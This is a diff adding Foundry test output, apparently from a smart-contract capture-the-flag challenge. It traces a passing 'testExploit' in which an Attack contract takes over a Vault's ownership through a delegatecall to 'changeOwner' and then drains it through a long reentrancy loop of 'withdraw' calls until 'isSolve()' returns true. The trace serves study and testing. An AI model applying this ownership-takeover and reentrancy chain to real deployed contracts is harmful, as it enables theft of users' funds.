@@ -1,0 +1,86 @@
+
+Ran 1 test for test/Vault.t.sol:VaultExploiter
+[PASS] testExploit() (gas: 383307)
+Traces:
+  [403207] VaultExploiter::testExploit()
+    ├─ [0] VM::deal(SHA-256: [0x0000000000000000000000000000000000000002], 1000000000000000000 [1e18])
+    │   └─ ← [Return] 
+    ├─ [0] VM::startPrank(SHA-256: [0x0000000000000000000000000000000000000002])
+    │   └─ ← [Return] 
+    ├─ [183262] → new Attack@0xE536720791A7DaDBeBdBCD8c8546fb0791a11901
+    │   └─ ← [Return] 692 bytes of code
+    ├─ [0] VM::deal(Attack: [0xE536720791A7DaDBeBdBCD8c8546fb0791a11901], 1000000000000000000 [1e18])
+    │   └─ ← [Return] 
+    ├─ [11125] Vault::fallback(0x000000000000000000000000522b3294e6d06aa25ad0f1b8891242e335d3b459, Attack: [0xE536720791A7DaDBeBdBCD8c8546fb0791a11901])
+    │   ├─ [5818] VaultLogic::changeOwner(0x000000000000000000000000522b3294e6d06aa25ad0f1b8891242e335d3b459, Attack: [0xE536720791A7DaDBeBdBCD8c8546fb0791a11901]) [delegatecall]
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [529] Vault::owner() [staticcall]
+    │   └─ ← [Return] Attack: [0xE536720791A7DaDBeBdBCD8c8546fb0791a11901]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return] 
+    ├─ [0] VM::startPrank(Attack: [0xE536720791A7DaDBeBdBCD8c8546fb0791a11901])
+    │   └─ ← [Return] 
+    ├─ [22488] Vault::openWithdraw()
+    │   └─ ← [Stop] 
+    ├─ [22560] Vault::deposite{value: 100000000000000000}()
+    │   └─ ← [Stop] 
+    ├─ [95976] Vault::withdraw()
+    │   ├─ [87987] Attack::fallback{value: 100000000000000000}()
+    │   │   ├─ [87208] Vault::withdraw()
+    │   │   │   ├─ [79219] Attack::fallback{value: 100000000000000000}()
+    │   │   │   │   ├─ [78440] Vault::withdraw()
+    │   │   │   │   │   ├─ [70451] Attack::fallback{value: 100000000000000000}()
+    │   │   │   │   │   │   ├─ [69672] Vault::withdraw()
+    │   │   │   │   │   │   │   ├─ [61683] Attack::fallback{value: 100000000000000000}()
+    │   │   │   │   │   │   │   │   ├─ [60904] Vault::withdraw()
+    │   │   │   │   │   │   │   │   │   ├─ [52915] Attack::fallback{value: 100000000000000000}()
+    │   │   │   │   │   │   │   │   │   │   ├─ [52136] Vault::withdraw()
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [44147] Attack::fallback{value: 100000000000000000}()
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [43368] Vault::withdraw()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [35379] Attack::fallback{value: 100000000000000000}()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [34600] Vault::withdraw()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [26611] Attack::fallback{value: 100000000000000000}()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [25832] Vault::withdraw()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [17843] Attack::fallback{value: 100000000000000000}()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [17064] Vault::withdraw()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9075] Attack::fallback{value: 100000000000000000}()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [8296] Vault::withdraw()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [307] Attack::fallback{value: 100000000000000000}()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   └─ ← [Stop] 
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return] 
+    ├─ [0] VM::prank(SHA-256: [0x0000000000000000000000000000000000000002])
+    │   └─ ← [Return] 
+    ├─ [7253] Attack::withdraw()
+    │   ├─ [60] PRECOMPILES::sha256{value: 2000000000000000000}(0x)
+    │   │   └─ ← [Return] 0xe3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+    │   └─ ← [Stop] 
+    ├─ [461] Vault::isSolve() [staticcall]
+    │   └─ ← [Return] true
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.84ms (617.17µs CPU time)
+
+Ran 1 test suite in 993.97ms (5.84ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
